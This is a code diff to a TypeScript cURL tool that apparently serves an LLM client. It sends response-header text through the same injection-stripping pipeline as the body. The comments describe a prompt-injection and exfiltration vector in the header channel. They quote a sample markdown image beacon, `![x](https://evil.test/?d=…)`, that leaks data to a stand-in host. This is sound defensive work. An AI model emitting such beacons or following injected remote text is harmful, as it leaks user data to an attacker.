@@ -6,7 +6,7 @@ import { CurlExecuteSchema, type CurlExecuteInput } from "../server/schemas.js";
 import { TEMP_DIR, LIMITS } from "../config/index.js";
 import { generateMetadataSeparator } from "../types/index.js";
 import { resolveOutputDir, validateOutputDir } from "../files/index.js";
-import { validateUrlAndResolveDns, checkRateLimits, sanitizeAndDetect } from "../security/index.js";
+import { validateUrlAndResolveDns, checkRateLimits } from "../security/index.js";
 import { getErrorMessage, safeHostname } from "../utils/index.js";
 import { executeCommand, buildCurlArgs } from "../execution/index.js";
 import {
@@ -14,6 +14,7 @@ import {
     sanitizeErrorMessage,
     formatResponse,
     processResponse,
+    defendText,
     splitResponseHeaders,
 } from "../response/index.js";
 
@@ -56,9 +57,10 @@ Args:
   - basic_auth (string): Basic auth as "username:password"
   - bearer_token (string): Bearer token for Authorization header
   - verbose (boolean): Include verbose request/response details
-  - include_headers (boolean): Report response headers alongside the body. Headers are kept
-    separate from the body, so this combines safely with jq_filter and save_to_file
-    (the saved file holds the body only)
+  - include_headers (boolean): Report response headers alongside the body, under a
+    separate "headers" key. Headers are kept out of the body, so this combines safely
+    with jq_filter and save_to_file (the saved file holds the body only). Header text
+    is truncated at 64KB with a visible marker
   - compressed (boolean): Request compressed response (default: true)
   - include_metadata (boolean): Wrap response in JSON with metadata
   - jq_filter (string): JSON path filter to extract specific data
@@ -84,7 +86,8 @@ Returns:
   {
     "success": boolean,
     "exit_code": number,
-    "response": string,
+    "response": string (the body alone — headers are NOT in here),
+    "headers": string (response header text; present only with include_headers),
     "stderr": string (if present),
     "saved_to_file": boolean (if response was saved),
     "filepath": string (path to saved file)
@@ -172,7 +175,7 @@ export async function executeCurlRequest(
         const result = await executeCommand("curl", args, timeoutMs);
 
         // Parse response using the same unique separator
-        const { body: rawBody, contentType } = parseResponseWithMetadata(
+        const { body: rawBody, contentType, headerBytes } = parseResponseWithMetadata(
             result.stdout,
             metadataSeparator
         );
@@ -182,17 +185,43 @@ export async function executeCurlRequest(
         // together, the header text corrupted every body-shaped operation —
         // `save_to_file` wrote a file that was no longer the JSON it claimed to
         // be, and `jq_filter` had to be refused outright.
+        //
+        // The split point comes from cURL's own `%{size_header}`, never from
+        // scanning the bytes — see `splitResponseHeaders` for why inferring it
+        // cannot work.
         let responseHeaders: string | undefined;
         let body = rawBody;
         if (params.include_headers) {
-            const split = splitResponseHeaders(rawBody);
+            const split = splitResponseHeaders(rawBody, headerBytes);
             body = split.body;
-            // Header text is server-controlled, so it gets the same sanitise +
-            // injection-detection treatment `processResponse` applies to the
-            // body. Splitting it out must not route it around that.
-            responseHeaders = split.headerText
-                ? sanitizeAndDetect(split.headerText, safeHostname(params.url))
-                : undefined;
+            if (split.headerText) {
+                // Header text is remote-origin text bound for the LLM, so it
+                // takes the SAME pipeline as the body — not a shorter one.
+                // `sanitizeAndDetect` alone was Step 2 only: it left markdown
+                // beacons, <script>/<style> blocks and numeric-entity-masked
+                // injections intact in the header channel after they had been
+                // stripped from the body for years.
+                //
+                // Header text is declared `text/markdown` — the strictest
+                // grammar, not the body's content-type and not `text/plain`.
+                //
+                // The body's type is the wrong question: it describes the
+                // BODY. And `text/plain` would be worse than wrong, because
+                // it turns off `stripMarkdownBeacons` — which is the stage
+                // that removes `![x](https://evil.test/?d=…)`, the exact
+                // exfiltration vector this channel carries. Header values are
+                // rendered by whatever the MCP client renders, so the only
+                // safe assumption is that markdown is live in them. Declaring
+                // the strictest grammar runs every strip stage; over-stripping
+                // a header value costs nothing, under-stripping one is the bug.
+                //
+                // Already capped to LIMITS.MAX_HEADER_TEXT_BYTES by the split,
+                // so this pipeline runs on bounded input.
+                responseHeaders = defendText(split.headerText, {
+                    contentType: "text/markdown",
+                    hostname: safeHostname(params.url),
+                });
+            }
         }
 
         // Process response with filtering and size handling
